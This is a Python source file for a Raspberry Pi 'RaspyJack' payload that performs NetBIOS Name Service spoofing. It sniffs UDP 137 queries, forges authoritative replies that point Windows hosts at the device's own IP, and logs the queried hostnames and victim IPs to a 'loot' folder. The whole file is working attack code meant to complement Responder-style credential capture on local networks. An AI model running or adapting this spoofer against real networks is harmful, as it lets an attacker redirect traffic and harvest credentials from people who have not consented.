#!/usr/bin/env python3
"""
RaspyJack Payload -- NBNS Spoof
=================================
Author: 7h30th3r0n3

NetBIOS Name Service (NBNS) spoofing.
Listens for NBNS queries (UDP 137 broadcast) and responds with the
Pi's IP address, tricking Windows hosts into connecting to us.

Flow:
  1) Sniff NBNS queries on UDP port 137
  2) Extract queried hostname
  3) Respond with our IP as the resolved address
  4) Log all queries and responses

Controls:
  OK        -- Start / stop spoofing
  UP / DOWN -- Scroll captured queries
  KEY1      -- Toggle auto-respond (on/off)
  KEY2      -- Export captured data
  KEY3      -- Exit

Loot: /root/Raspyjack/loot/NBNSSpoof/

Setup: No special requirements. Complements Responder.
"""

import os
import sys
import time
import json
import threading
import subprocess
import struct
import socket
from datetime import datetime
from collections import OrderedDict

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44
import LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button

try:
    from scapy.all import (
        sniff, send, IP, UDP, NBNSQueryRequest, NBNSQueryResponse,
        Raw, conf,
    )
    SCAPY_OK = True
except ImportError:
    try:
        from scapy.all import sniff, send, IP, UDP, Raw, conf
        SCAPY_OK = True
    except ImportError:
        SCAPY_OK = False

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = LCD.width, LCD.height
font = scaled_font()

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
LOOT_DIR = "/root/Raspyjack/loot/NBNSSpoof"
os.makedirs(LOOT_DIR, exist_ok=True)
ROWS_VISIBLE = 6
NBNS_PORT = 137

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
queries = []              # [{"ts", "src_ip", "hostname", "responded"}]
unique_hostnames = set()
queries_count = 0
responses_sent = 0
auto_respond = True
spoof_active = False
app_running = True
scroll_pos = 0
status_msg = "Ready"
my_ip = ""


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _get_my_ip():
    """Get our IP on the default interface."""
    try:
        r = subprocess.run(["ip", "route", "get", "1.1.1.1"],
                           capture_output=True, text=True, timeout=5)
        for part in r.stdout.split():
            if part.count(".") == 3:
                import re
                if re.match(r"\d+\.\d+\.\d+\.\d+", part):
                    # Skip 1.1.1.1 itself
                    if part != "1.1.1.1":
                        return part
    except Exception:
        pass
    return "0.0.0.0"


def _decode_nbns_name(raw_name):
    """Decode a NetBIOS encoded name from raw bytes."""
    try:
        if isinstance(raw_name, bytes):
            name = raw_name.decode("ascii", errors="ignore")
        else:
            name = str(raw_name)
        # NBNS names are half-ASCII encoded: each char = 2 chars (A-P encoding)
        # Try to decode if it looks encoded
        if len(name) == 32 and all(c in "ABCDEFGHIJKLMNOP" for c in name):
            decoded = ""
            for i in range(0, 32, 2):
                ch = chr(((ord(name[i]) - ord("A")) << 4) |
                         (ord(name[i + 1]) - ord("A")))
                decoded += ch
            return decoded.strip().rstrip("\x00").strip()
        return name.strip().rstrip("\x00").strip()
    except Exception:
        return str(raw_name)[:15]


def _build_nbns_response(src_ip, src_port, txn_id, queried_name, spoof_ip):
    """Build a raw NBNS response packet."""
    # NBNS response: Transaction ID + Flags + Questions + Answers + ...
    # Flags: 0x8500 (response, authoritative)
    resp_data = struct.pack(">H", txn_id)
    resp_data += struct.pack(">H", 0x8500)  # Flags
    resp_data += struct.pack(">H", 0)       # Questions
    resp_data += struct.pack(">H", 1)       # Answer RRs
    resp_data += struct.pack(">H", 0)       # Authority RRs
    resp_data += struct.pack(">H", 0)       # Additional RRs

    # Encode name for response (length-prefixed NBNS name)
    encoded_name = b"\x20"  # length = 32
    name_padded = queried_name.ljust(16, " ")[:16]
    for ch in name_padded:
        encoded_name += bytes([((ord(ch) >> 4) + ord("A")),
                                ((ord(ch) & 0x0F) + ord("A"))])
    encoded_name += b"\x00"  # null terminator

    resp_data += encoded_name
    resp_data += struct.pack(">H", 0x0020)   # Type: NB
    resp_data += struct.pack(">H", 0x0001)   # Class: IN
    resp_data += struct.pack(">I", 300)       # TTL
    resp_data += struct.pack(">H", 6)         # Data length
    resp_data += struct.pack(">H", 0x0000)    # Flags
    resp_data += socket.inet_aton(spoof_ip)   # Our IP

    pkt = IP(dst=src_ip) / UDP(sport=NBNS_PORT, dport=src_port) / Raw(load=resp_data)
    return pkt


def _packet_handler(pkt):
    """Process incoming NBNS queries."""
    global queries_count, responses_sent

    if not pkt.haslayer(UDP):
        return
    udp = pkt[UDP]
    if udp.dport != NBNS_PORT:
        return
    if not pkt.haslayer(IP):
        return

    src_ip = pkt[IP].src
    src_port = udp.sport

    # Parse raw NBNS query
    payload = bytes(udp.payload)
    if len(payload) < 12:
        return

    txn_id = struct.unpack(">H", payload[:2])[0]
    flags = struct.unpack(">H", payload[2:4])[0]

    # Only process queries (bit 15 = 0)
    if flags & 0x8000:
        return

    # Extract queried name
    hostname = "UNKNOWN"
    try:
        name_start = 12
        name_len = payload[name_start]
        if name_len == 0x20:  # 32 bytes encoded
            raw_name = payload[name_start + 1:name_start + 1 + name_len]
            hostname = _decode_nbns_name(raw_name)
    except Exception:
        pass

    entry = {
        "ts": datetime.now().strftime("%H:%M:%S"),
        "src_ip": src_ip,
        "hostname": hostname,
        "responded": False,
    }

    with lock:
        queries_count += 1
        unique_hostnames.add(hostname)

    # Send spoofed response if auto-respond is on
    responded = False
    if auto_respond and my_ip and my_ip != "0.0.0.0":
        try:
            resp = _build_nbns_response(src_ip, src_port, txn_id, hostname, my_ip)
            send(resp, verbose=False)
            responded = True
            with lock:
                responses_sent += 1
        except Exception:
            pass

    entry["responded"] = responded
    with lock:
        new_queries = list(queries) + [entry]
        # Keep last 200
        if len(new_queries) > 200:
            new_queries = new_queries[-200:]
        queries.clear()
        queries.extend(new_queries)


def _sniff_thread():
    """Sniff NBNS queries."""
    global status_msg
    with lock:
        status_msg = "Sniffing NBNS..."
    try:
        sniff(
            filter="udp port 137",
            prn=_packet_handler,
            store=False,
            stop_filter=lambda _: not app_running or not spoof_active,
        )
    except Exception as exc:
        with lock:
            status_msg = f"Sniff err: {exc}"


# ---------------------------------------------------------------------------
# Export
# ---------------------------------------------------------------------------

def _export_data():
    global status_msg
    with lock:
        data = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "spoof_ip": my_ip,
            "queries_total": queries_count,
            "responses_sent": responses_sent,
            "unique_hostnames": sorted(unique_hostnames),
            "queries": list(queries)[-100:],
        }
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = os.path.join(LOOT_DIR, f"nbns_{ts}.json")
    try:
        with open(path, "w") as fh:
            json.dump(data, fh, indent=2)
        with lock:
            status_msg = "Exported to loot"
    except Exception:
        pass


# ---------------------------------------------------------------------------
# LCD rendering
# ---------------------------------------------------------------------------

def _draw_screen():
    img = Image.new("RGB", (WIDTH, HEIGHT), "BLACK")
    draw = ScaledDraw(img)
    draw.text((2, 2), "NBNS SPOOF", fill="CYAN", font=font)

    with lock:
        st = status_msg
        qc = queries_count
        rs = responses_sent
        uh = len(unique_hostnames)
        q_list = list(queries)
        sp = scroll_pos
        ar = auto_respond
        active = spoof_active

    indicator = "ON" if active else "OFF"
    ind_color = "GREEN" if active else "RED"
    draw.text((90, 2), indicator, fill=ind_color, font=font)

    draw.text((2, 14), f"Q:{qc} R:{rs} U:{uh}", fill="WHITE", font=font)

    ar_label = "AUTO" if ar else "MANUAL"
    ar_color = "GREEN" if ar else "YELLOW"
    draw.text((80, 14), ar_label, fill=ar_color, font=font)

    y = 28
    visible = q_list[-(sp + ROWS_VISIBLE):][-ROWS_VISIBLE:] if q_list else []
    for entry in visible:
        r_mark = "+" if entry["responded"] else "-"
        label = f"{r_mark}{entry['hostname'][:10]} {entry['src_ip'].split('.')[-1]}"
        color = "GREEN" if entry["responded"] else "GRAY"
        draw.text((2, y), label[:22], fill=color, font=font)
        y += 14

    if not q_list:
        draw.text((2, 56), "Waiting for queries", fill="GRAY", font=font)

    draw.text((2, 116), "OK=go K1=auto K3=exit", fill="GRAY", font=font)
    LCD.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    global app_running, spoof_active, auto_respond, scroll_pos
    global status_msg, my_ip

    if not SCAPY_OK:
        img = Image.new("RGB", (WIDTH, HEIGHT), "BLACK")
        d = ScaledDraw(img)
        d.text((4, 50), "scapy not found!", font=font, fill="RED")
        LCD.LCD_ShowImage(img, 0, 0)
        time.sleep(3)
        GPIO.cleanup()
        return

    my_ip = _get_my_ip()

    try:
        _draw_screen()

        while app_running:
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                app_running = False
                break

            elif btn == "OK":
                if not spoof_active:
                    spoof_active = True
                    threading.Thread(target=_sniff_thread, daemon=True).start()
                else:
                    spoof_active = False
                    with lock:
                        status_msg = "Stopped"

            elif btn == "UP":
                with lock:
                    if scroll_pos < max(0, len(queries) - ROWS_VISIBLE):
                        scroll_pos += 1

            elif btn == "DOWN":
                with lock:
                    if scroll_pos > 0:
                        scroll_pos -= 1

            elif btn == "KEY1":
                auto_respond = not auto_respond

            elif btn == "KEY2":
                threading.Thread(target=_export_data, daemon=True).start()

            _draw_screen()
            time.sleep(0.15)

    finally:
        app_running = False
        spoof_active = False
        try:
            img = Image.new("RGB", (WIDTH, HEIGHT), "BLACK")
            d = ScaledDraw(img)
            d.text((10, 50), "NBNS Spoof stopped", fill="YELLOW", font=font)
            LCD.LCD_ShowImage(img, 0, 0)
        except Exception:
            pass
        GPIO.cleanup()


if __name__ == "__main__":
    main()
